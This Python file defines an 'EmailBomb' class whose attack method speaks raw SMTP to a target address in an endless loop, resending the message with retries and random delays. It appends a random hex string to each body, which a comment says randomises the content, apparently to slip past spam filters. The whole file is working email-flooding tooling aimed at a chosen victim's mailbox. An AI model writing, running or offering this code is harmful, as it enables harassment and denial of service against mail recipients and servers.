# -*- coding: utf-8 -*-
import Email
import random
import string
import time


class EmailBomb:
    def __init__(self, id, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
        self.status_header = "No.{}: ".format(id)
        self.status = []
        self.to_addr = to_addr
        self.from_addr = from_addr
        self.port = port
        self.timeout = timeout
        self.SMTP_addrs = [SMTP_addr] if SMTP_addr else []  # 必须为列表

        self.exit_flag = 0  # 1：收到退出指令；0：未收到退出指令
        self.running = 1  # 0：退出；1：未退出

        self.update_status("creating", color="yellow")
        self.create()

    def update_status(self, body, color="white", code=-1):
        '''
        保存状态
        '''

        if self.exit_flag:
            return False

        if type(body) == list:
            body = body[-1]  # 返回多个信息的时候只取最后一个条

        if code != -1:  # 只有在返回信息的时候 update_status 才会指定 code
            body = "<= "+body
            if code:  # 正确信息
                color = "green"
            else:
                color = "red"

        self.status_body = body
        self.status.insert(0, (self.status_header, self.status_body, color))

    def create(self):
        self.emailer = Email.Email(
            to_addr=self.to_addr,
            from_addr=self.from_addr,
            SMTP_addrs=self.SMTP_addrs,
            port=self.port,
            timeout=self.timeout,
        )

    def attack(self, subject, content):
        '''
        攻击启动
        '''

        while not self.exit_flag:
            # 建立连接
            while not self.exit_flag:
                self.update_status("=> try to connect")
                code, msg = self.emailer.Connect()
                self.update_status(msg, code=code)
                if code:
                    # 建立会话
                    self.update_status("=> send ehlo")
                    code, msg = self.emailer.Send(u"ehlo antispam")
                    self.update_status(msg, code=code)
                    if not code:
                        time.sleep(2)
                        continue
                else:
                    time.sleep(2)

                time.sleep(random.random())
                # 表明发件地址
                self.update_status("=> send mail from")
                code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
                self.update_status(msg, code=code)
                if not code:
                    time.sleep(2)
                    continue

                time.sleep(random.random())
                self.update_status("=> send rcpt to")
                # 表明收件地址
                code, msg = self.emailer.Send(u"rcpt to:<%s>" % self.to_addr)
                self.update_status(msg, code=code)
                if code:
                    break
                else:
                    time.sleep(2)

            while not self.exit_flag:
                # 信件具体内容
                self.update_status("=> send data")
                code, msg = self.emailer.Send(u"data")
                self.update_status(msg, code=code)
                if code:
                    break
                else:
                    time.sleep(2)

            while not self.exit_flag:
                # to:
                self.update_status("=> send to")
                code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
                self.update_status(msg, code=code)
                if not code:
                    time.sleep(2)
                    continue

                # from:
                self.update_status("=> send from")
                code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
                self.update_status(msg, code=code)
                if not code:
                    time.sleep(2)
                    continue

                # subject:
                self.update_status("=> send subject")
                code, msg = self.emailer.Send("subject: "+subject+"\r\n", recv=False)
                self.update_status(msg, code=code)
                if not code:
                    time.sleep(2)
                    continue

                break  # 上面都发送成功的话，就 break

            while not self.exit_flag:
                # body:
                self.update_status("=> send body")
                code, msg = self.emailer.Send(
                    content+u"\r\n\r\n你的专属链接为："+"".join(
                        random.choice(string.hexdigits)
                        for i in range(32)
                    )+"\r\n.\r\n",  # 随机化部分邮件内容

                    check="250"  # 状态码为 250 说明发送成功
                )

                self.update_status(msg, code=code)
                time.sleep(2)

                if not code:
                    break

        self.running = 0
